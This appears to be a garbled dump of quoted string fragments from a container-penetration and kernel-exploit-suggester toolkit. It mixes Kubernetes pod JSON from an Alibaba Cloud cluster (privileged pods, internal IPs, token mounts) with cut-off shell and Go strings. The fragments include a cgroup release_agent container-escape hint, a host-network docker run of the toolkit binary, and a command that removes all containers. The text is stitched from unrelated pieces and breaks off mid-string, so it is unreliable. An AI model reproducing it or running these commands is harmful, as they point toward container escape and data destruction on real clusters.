dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""node-role.kubernetes.io/master"":""""},""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.151"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.151""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:34Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:34Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.151"",""podIP"":""192.168.0.151"",""podIPs"":[{""ip"":""192.168.0.151""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-master"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:32Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://99dd49254f15530507286069a374e6b38ed814cd926378f1a975aaf7dd27ee29"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-proxy-worker-84qsm"",""generateName"":""kube-proxy-worker-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-84qsm"",""uid"":""252c322a-a5ed-47b2-a993-f11f3c6e6ba9"",""resourceVersion"":""1756"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""controller-revision-hash"":""6775794f84"",""k8s-app"":""kube-proxy-worker"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-worker"",""uid"":""d9eead21-3360-481f-ad44-f546c22733cc"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-worker"",""configMap"":{""name"":""kube-proxy-worker"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-worker"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-worker"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.154"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.154""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.154"",""podIP"":""192.168.0.154"",""podIPs"":[{""ip"":""192.168.0.154""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-worker"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://f28268e8e1098db0022d78c9a8d3bc07c65f0826dc7fa49b712e3981ceff0da9"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-proxy-worker-dfq46"",""generateName"":""kube-proxy-worker-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-dfq46"",""uid"":""14948498-2760-4cd1-87dd-dd2a1a85c826"",""resourceVersion"":""1696"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""controller-revision-hash"":""6775794f84"",""k8s-app"":""kube-proxy-worker"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-worker"",""uid"":""d9eead21-3360-481f-ad44-f546c22733cc"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-worker"",""configMap"":{""name"":""kube-proxy-worker"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-worker"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-worker"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.155"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.155""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:41Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:41Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.155"",""podIP"":""192.168.0.155"",""podIPs"":[{""ip"":""192.168.0.155""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-worker"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:41Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://04d1c794694bd4e27ce71374b6455ee3984b13b154384db61c6ad16511328d07"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-proxy-worker-p77nb"",""generateName"":""kube-proxy-worker-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-p77nb"",""uid"":""0c4dc85b-fd8a-4ed3-83d5-551b04d4eb91"",""resourceVersion"":""1731"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""controller-revision-hash"":""6775794f84"",""k8s-app"":""kube-proxy-worker"",""pod-template-generation"":""1""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-worker"",""uid"":""d9eead21-3360-481f-ad44-f546c22733cc"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""kube-proxy-worker"",""configMap"":{""name"":""kube-proxy-worker"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}],""containers"":[{""name"":""kube-proxy-worker"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)""],""env"":[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}],""resources"":{},""volumeMounts"":[{""name"":""kube-proxy-worker"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""privileged"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""serviceAccountName"":""kube-proxy"",""serviceAccount"":""kube-proxy"",""nodeName"":""cn-beijing.192.168.0.153"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.153""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:43Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:43Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:31Z""}],""hostIP"":""192.168.0.153"",""podIP"":""192.168.0.153"",""podIPs"":[{""ip"":""192.168.0.153""}],""startTime"":""2020-04-08T04:12:31Z"",""containerStatuses"":[{""name"":""kube-proxy-worker"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://7c58ea1cb003d9ae74cd29eba230e3c0371991db11e36a2ce304759ce22efff3"",""started"":true}],""qosClass"":""BestEffort""}},{""metadata"":{""name"":""kube-scheduler-cn-beijing.192.168.0.150"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.150"",""uid"":""8ef35ac0-0b9a-407c-a4f3-8e18c597a0c3"",""resourceVersion"":""35736340"",""creationTimestamp"":""2020-04-08T04:05:16Z"",""labels"":{""component"":""kube-scheduler"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.mirror"":""fb6b595bf06e476799e506ef26ec872f"",""kubernetes.io/config.seen"":""2020-04-08T12:05:05.300514759"
" cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf""],""resources"":{},""volumeMounts"":[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""readOnlyRootFilesystem"":true}}],""containers"":[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr""],""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""100m"",""memory"":""256Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""run"",""mountPath"":""/run""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ls -l /run/flannel/subnet.env""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN""]},""privileged"":false,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/arch"":""amd64"",""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""flannel"",""serviceAccount"":""flannel"",""nodeName"":""cn-beijing.192.168.0.155"",""hostNetwork"":true,""securityContext"":{},""affinity"":{""nodeAffinity"":{""requiredDuringSchedulingIgnoredDuringExecution"":{""nodeSelectorTerms"":[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.155""]}]}]}}},""schedulerName"":""default-scheduler"",""tolerations"":[{""operator"":""Exists""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute""},{""key"":""node.kubernetes.io/disk-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/memory-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/pid-pressure"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/unschedulable"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/network-unavailable"",""operator"":""Exists"",""effect"":""NoSchedule""}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:38Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:46Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:29Z""}],""hostIP"":""192.168.0.155"",""podIP"":""192.168.0.155"",""podIPs"":[{""ip"":""192.168.0.155""}],""startTime"":""2020-04-08T04:12:29Z"",""initContainerStatuses"":[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:37Z"",""finishedAt"":""2020-04-08T04:12:37Z"",""containerID"":""docker://992cb3ccc8d8befb3f2c889838478e7270d66d0d5e5b2315bd93ea7e2f9fb425""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://992cb3ccc8d8befb3f2c889838478e7270d66d0d5e5b2315bd93ea7e2f9fb425""}],""containerStatuses"":[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:39Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://b94f3946e44f89210a14788e570039a8f19cd5fc89b53c5362499f65fa270142"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""kube-flannel-ds-ssx5g"",""generateName"":""kube-flannel-ds-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-ssx5g"",""uid"":""edbc982c-c412-43b7-a404-2cf84b5bebde"",""resourceVersion"":""1882"",""creationTimestamp"":""2020-04-08T04:12:29Z"",""labels"":{""app"":""flannel"",""controller-revision-hash"":""5d9fd8ccf4"",""pod-template-generation"":""1"",""tier"":""node""},""annotations"":{""kubernetes.io/psp"":""ack.privileged"",""scheduler.alpha.kubernetes.io/critical-pod"":""""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""run"",""hostPath"":{""path"":""/run"",""type"":""""}},{""name"":""cni"",""hostPath"":{""path"":""/etc/cni/net.d"",""type"":""""}},{""name"":""flannel-cfg"",""configMap"":{""name"":""kube-flannel-cfg"",""defaultMode"":420}},{""name"":""flannel-token-pblrl"",""secret"":{""secretName"":""flannel-token-pblrl"",""defaultMode"":420}}],""initContainers"":[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x"
" cut -d'=' -f1))"""
" docker rm $(docker ps -aq)', [], [], False)"
" docker run -v /root/cdk_linux_amd64:/cdk_linux_amd64 --rm --net=host ubuntu /bin/bash -c ""/cdk_linux_amd64 cmd"""
" echo ""WARNING. Kernel Config not found on the system results won't be complete."""
" echo ""tag_pkg_num: $tag_pkg_num"
" echo -e ""              $analysis_url"""
" echo -e ""   Comments: $comments"""
" echo -e ""   Requirements: $reqs"""
" echo -e ""   Tags: $tags"""
" echo -e ""   author: $author"""
" echo -e ""   exploit-db: $EXPLOIT_DB"""
" echo -e ""   ext-url: $ext_url"""
" echo -e ""$pkgListFile"" "
" echo -e ""${txtgrn}$ARCH${txtrst}"" "
" echo -e ""${txtgrn}$DISTRO${txtrst}"" "
" echo -e ""${txtgrn}$OS${txtrst}"" "
" echo -e ""${txtgrn}performed${txtrst}"" "
" echo -e ""${txtred}N/A${txtrst}"")"""
" echo -e ""Kernel version: ${txtgrn}$KERNEL${txtrst}"" "
" echo -e ""Kernel version: ${txtred}N/A${txtrst}"""
" error: %v, response: %s"", opts.Api, err, resp)"
" exitWithErrMsg ""'src-url' / 'bin-url' / 'exploit-db' entries are all empty for '$NAME' exploit - fix that. Aborting."""
" exitWithErrMsg ""Aborting."""
" exitWithErrMsg ""Provided CVE list file does not exists. Aborting."""
" exitWithErrMsg ""Switches -f"
" exitWithErrMsg ""Switches -k"
" exitWithErrMsg ""Switches -p"
" exitWithErrMsg ""Switches -u"
" exitWithErrMsg ""Unrecognized kernel version given. Aborting."""
" exitWithErrMsg ""uname string empty. Aborting."""
" extract CVE(s) associated with given exploit (also translates ',' to '"
" extract kernel version and other OS info like distro name, distro version, etc. 3 possibilities here:"
" extract sysctl entry, relation sign and required value"
" fmt.Sprintf(""%d"", ipExt)"
" for 3rd party (3) mode display ""N/A"" or ""Enabled"""
" for attack-surface (4) mode display ""Locked"" or ""Exposed"""
" for cgroup, select one under root, since release_agent is writable only in root cgroup."
" github.com/,/has been explicitly marked deprecated here$/d'"
" grep ""$OS"")"" -a ""$opt_uname_string"" == ""true"" ] "
" grep ""$entry"" "
" grep ""CONFIG_"")"
" grep ""Comments: "" "
" grep ""Reqs: "" "
" grep ""analysis-url: "" "
" grep ""author: "" "
" grep ""bin-url: "" "
" grep ""enabled: "" "
" grep ""exploit-db: "" "
" grep ""ext-url: "" "
" grep ""feature: "" "
" grep ""src-url: "" "
" grep -E ""$cve"") ] "
" grep -E ""$tag_distro_num"")"" "
" grep -E ""${tag_pkg_num}"") ]"
" grep -E -i """
" grep -Ev """
" grep -i """
" grep -o -i ""(dos"")"
" grep -qi ""!="""
" grep -qi ""=="""
" grep -v grep""]},""initialDelaySeconds"":10,""timeoutSeconds"":1,""periodSeconds"":30,""successThreshold"":1,""failureThreshold"":3},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
" grep -v grep""]},""initialDelaySeconds"":10,""timeoutSeconds"":5,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent""}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""nodeSelector"":{""beta.kubernetes.io/os"":""linux""},""serviceAccountName"":""admin"",""serviceAccount"":""admin"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node-role.kubernetes.io/master"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.cloudprovider.kubernetes.io/uninitialized"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:59Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:59Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.195"",""podIPs"":[{""ip"":""172.20.0.195""}],""startTime"":""2020-04-08T04:12:44Z"",""containerStatuses"":[{""name"":""alicloud-application-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:49Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager:v0.1.0.1-f832bed-aliy